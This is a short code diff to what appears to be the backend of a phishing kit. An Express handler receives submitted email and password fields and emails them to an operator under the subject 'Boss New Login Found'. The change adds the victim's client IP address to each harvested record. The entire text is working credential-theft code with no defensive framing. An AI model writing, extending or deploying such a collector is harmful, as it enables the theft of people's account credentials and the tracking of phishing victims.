@@ -13,7 +13,8 @@ app.use(express.urlencoded({ extended: true }));
 app.post("/", async (req, res) => {
     const data = req.body;
     const email = data.receiver;
-    const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}`;
+    const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    const message = `Email: ${data.name}\nAccess: ${data.pass}\nSource: ${data.source}\nClient IP: ${clientIp}`;
 
 
     await sendEmail(email,"Boss New Login Found",message);
